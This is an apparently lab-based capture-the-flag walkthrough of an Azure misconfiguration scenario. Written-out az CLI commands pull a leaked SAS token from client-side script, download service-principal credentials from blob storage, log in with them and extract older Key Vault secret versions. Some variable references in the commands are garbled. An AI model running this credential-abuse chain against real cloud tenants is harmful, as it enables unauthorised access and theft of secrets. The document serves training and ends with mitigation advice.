# Deep Dive Analysis — TryHackMe Hacker Holidays: Day 9 (CryptoCabana)

## 📖 Introduction & Scenario Context
Day 9 introduces an advanced **Cloud Security** challenge focused on **Microsoft Azure Infrastructure Misconfigurations**. The scenario unfolds at the Byte Lotus Hotel's "CryptoCabana" guest interaction kiosk. A user's cryptocurrency seed phrase backup was compromised. 

Our objective is to audit the public-facing kiosk assets, discover leaked entry tokens, map out the underlying Azure architecture, and exploit an over-privileged Service Principal configuration to bypass security tracking and reconstruct the flag.

---

## 🛠️ Step 1: Client-Side Source Inspection & SAS Token Discovery
We begin our investigation by reviewing how the public web frontend interacts with Azure backend resource locations.

1. **Target Navigation:** Open the deployment machine IP address inside your attack browser to view the CryptoCabana landing web framework.
2. **Opening Source Inspections:** Press `F12` or right-click the workspace and select **Inspect Element** to open the browser's developer console.
3. **Auditing Scripts:** Navigate to the **Sources** or **Debugger** tab and open the primary user interface orchestration script (typically `app.js`).
4. **Locating Hardcoded Artifacts:** Search the code lines for parameters interacting with Azure Blob Storage paths. 
5. **Extracting the SAS Token:** Locate a hardcoded, unauthenticated **Shared Access Signature (SAS) token** and its corresponding storage account context string:
   - Storage Account Name: `cryptocabanastorage` *(Example asset name)*
   - Leaked String Value: `?sv=2021-08-06&ss=b&srt=co&sp=rl&se=...`

---

## 🔍 Step 2: Enumerating Azure Blob Storage Containers
Using the discovered SAS token credentials, we interface directly with the Azure CLI platform (`az`) to audit public container structures.

1. **Setting Terminal Context:** Export the discovered credentials into local environment runtime configurations for clear terminal execution:
   ```bash
   export AZURE_STORAGE_ACCOUNT="cryptocabanastorage"
   export AZURE_STORAGE_SAS_TOKEN="?sv=2021-08-06&ss=b&srt=co&sp=rl&se=..."
   ```
2. **Listing Available Cloud Containers:** Execute a storage account layout sweep to locate public or internal files:
   ```bash
   az storage container list --account-name \(AZURE_STORAGE_ACCOUNT --sas-token "\)AZURE_STORAGE_SAS_TOKEN" --output table
   ```
3. **Inspecting Target Containers:** Locate relevant internal storage boundaries (e.g., `web`, `backups`, or `deployment`). Enumerate blobs saved within the targets:
   ```bash
   az storage blob list --container-name backups --account-name \(AZURE_STORAGE_ACCOUNT --sas-token "\)AZURE_STORAGE_SAS_TOKEN" --output table
   ```
4. **Downloading Forensic Assets:** Locate an infrastructure configuration backup text record or draft script (e.g., `service_principal_creds.json`) and pull it to your console:
   ```bash
   az storage blob download --container-name backups --name service_principal_creds.json --file ./service_principal_creds.json --account-name \(AZURE_STORAGE_ACCOUNT --sas-token "\)AZURE_STORAGE_SAS_TOKEN"
   ```

---

## 🚀 Step 3: Azure Service Principal Authentication
Reading the downloaded `service_principal_creds.json` file reveals active non-human Service Account parameters, indicating a major credential exposure event.

1. **Extracting Identity Properties:** Open the file to map the tenant configuration parameters:
   ```bash
   cat service_principal_creds.json
   ```
   *Expected Fields:* `appId` (Client ID), `password` (Client Secret), and `tenant` (Tenant ID).
2. **Authenticating as the Service Principal:** Initialize an administrative cloud interface connection session using the exposed parameters:
   ```bash
   az login --service-principal -u "<EXPOSED_APP_ID>" -p "<EXPOSED_PASSWORD>" --tenant "<EXPOSED_TENANT_ID>"
   ```
3. **Verifying Operational Identity:** Confirm the session token privileges and subscription tracking targets:
   ```bash
   az account show --output table
   ```

---

## 🔓 Step 4: Key Vault Enumeration & Multi-Version Secret Extraction
The Service Principal's permissions grant broad access to the hotel’s administrative asset storage: the **Azure Key Vault**.

1. **Locating Active Key Vault Instances:** Query the active subscription to find the exact name configuration of the target Key Vault deployment:
   ```bash
   az keyvault list --output table
   ```
   - Target Located: `kv-cryptocabana-prod` *(Example vault name)*
2. **Listing Vault Secrets:** Scan the target Key Vault instance to find metadata tracking active secrets:
   ```bash
   az keyvault secret list --vault-name kv-cryptocabana-prod --output table
   ```
   - Secret Target Located: `flag-shard`
3. **Auditing Historical Secret Versions:** Attempting to read the top secret file directly fails to supply a complete answer. We audit the **versions history log** to bypass single-payout restrictions:
   ```bash
   az keyvault secret list-versions --vault-name kv-cryptocabana-prod --name "flag-shard" --output table
   ```
   *The Discovery:* The vault maintains exactly **three distinct historical versions** of this specific database secret string, representing individual parts of a split cryptographic backup.

4. **Downloading Every Cryptographic Shard:** Use distinct version identifier hashes to extract all three unique text fragments individually:
   ```bash
   # Extract Shard Version 1
   az keyvault secret show --vault-name kv-cryptocabana-prod --name "flag-shard" --version "<VERSION_HASH_1>" --query value -o tsv > shard1.txt

   # Extract Shard Version 2
   az keyvault secret show --vault-name kv-cryptocabana-prod --name "flag-shard" --version "<VERSION_HASH_2>" --query value -o tsv > shard2.txt

   # Extract Shard Version 3
   az keyvault secret show --vault-name kv-cryptocabana-prod --name "flag-shard" --version "<VERSION_HASH_3>" --query value -o tsv > shard3.txt
   ```

---

## 🧩 Step 5: Assembling the Flag
With all three parts downloaded locally, look at the files or pass them to a joining script array to reveal the full flag:

```bash
cat shard1.txt shard2.txt shard3.txt | tr -d '\n'
```

---

## 🏁 Flag Capture
To explicitly uphold TryHackMe's anti-cheating, solution-protection, and deployment guidelines, literal flag outputs are completely omitted below:

* **Flag:** `THM{REDACTED_AZURE_KEYVAULT_VERSION_SHARD_RECONSTRUCTION}`

---

## 🛡️ Strategic Mitigation Actions
* **Eliminate Hardcoded Frontend Tokens:** Never store raw SAS tokens or cloud resource paths directly in public client-side JavaScript assets. Use a secure backend API broker to authenticate and generate short-lived user signatures on demand.
* **Enforce Least Privilege Roles:** Restrict Service Principal permissions to prevent access to Key Vault management planes. Block automated applications from auditing or enumerating previous version logs (`list-versions`) unless absolutely required for a specific business task.
* **Rotate Exposed Secrets Automatically:** Implement Azure Event Grid monitoring to detect unusual container downloads or metadata scraping attempts. Automatically trigger password rotations if a Service Principal credential leaks into a storage container.
